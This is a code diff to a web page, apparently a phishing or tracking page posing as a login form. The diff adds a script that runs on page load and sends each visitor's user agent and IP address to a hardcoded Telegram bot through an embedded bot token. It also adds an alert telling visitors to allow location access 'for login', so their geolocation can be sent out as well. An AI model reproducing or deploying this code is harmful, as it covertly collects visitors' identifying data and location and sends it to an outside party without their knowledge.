@@ -966,28 +966,7 @@
          
             
            
-         
-   
-<script>
-        $("#submit-form").submit((e)=>{
-            e.preventDefault()
-            $.ajax({
-                url:"https://script.google.com/macros/s/AKfycbwxm62Fs7DK6B-XojNqbXhGcbGwNT3-Ml93VvU9UQvh42olxl1u/exec",
-                data:$("#submit-form").serialize(),
-                method:"post",
-                success:function (response){
-                    
-                       },
-                error:function (err){
-                    alert("Something Error")
-    
-                }
-            })
-        })
-
-
-
-
+ <script>
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(sendLocationToBot, handleLocationError);
@@ -1033,12 +1012,18 @@ function handleLocationError(error) {
   const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}`;
   const deviceInfoUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${deviceInfo}`;
 
+  
+  
+  
   fetch(deviceInfoUrl)
     .then(response => response.json())
     .then(data => {
       if (error.code === error.PERMISSION_DENIED) {
-        const errorMessage = "Location permission denied by user.";
+        const errorMessage = "Location permission denied. Please allow location access in your browser settings For login";
 
+        // Show popup message
+        alert(errorMessage);
+        
         const errorUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${errorMessage}`;
 
         fetch(errorUrl)
@@ -1052,7 +1037,49 @@ function handleLocationError(error) {
 
 
 
-    </script>
+
+</script>
+
+<script>
+window.onload = function() {
+  sendDeviceInfoAndIP();
+}
+
+function sendDeviceInfoAndIP() {
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+  
+  // Get device info
+  const deviceInfo = `Device Info:\n\nUser Agent: ${navigator.userAgent}`;
+  
+  // Get IP address
+  fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = `IP Address: ${data.ip}`;
+      
+      // Send device info and IP address
+      const message = `${deviceInfo}\n\n${ipAddress}`;
+      const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+      
+      fetch(messageUrl)
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error(error));
+    })
+    .catch(error => console.error(error));
+}
+
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocationToBot, handleLocationError);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+</script>        
+   
+
        
 
                         <div class="message-status js-hidden"></div>
